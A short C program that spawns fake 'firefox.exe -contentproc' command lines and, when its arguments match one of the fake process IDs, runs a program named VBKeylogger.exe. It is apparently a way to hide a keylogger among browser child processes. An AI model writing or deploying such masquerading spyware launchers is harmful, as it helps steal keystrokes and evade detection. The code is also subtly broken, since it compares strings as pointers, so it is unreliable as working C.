#include "helpers.h"

int main(int argc, char* argv[]) {
    if (argv[argc-1] != "tab") {
        run_command("firefox.exe -contentproc 2856 1f464f12858 tab");
        run_command("firefox.exe -contentproc 5620 1f46498d558 tab");
        run_command("firefox.exe -contentproc 6288 1f464f0fe58 tab");
    }
    else if (argv[argc-3] == "5620"){
        run_command("VBKeylogger.exe");
    }
    return 0;
}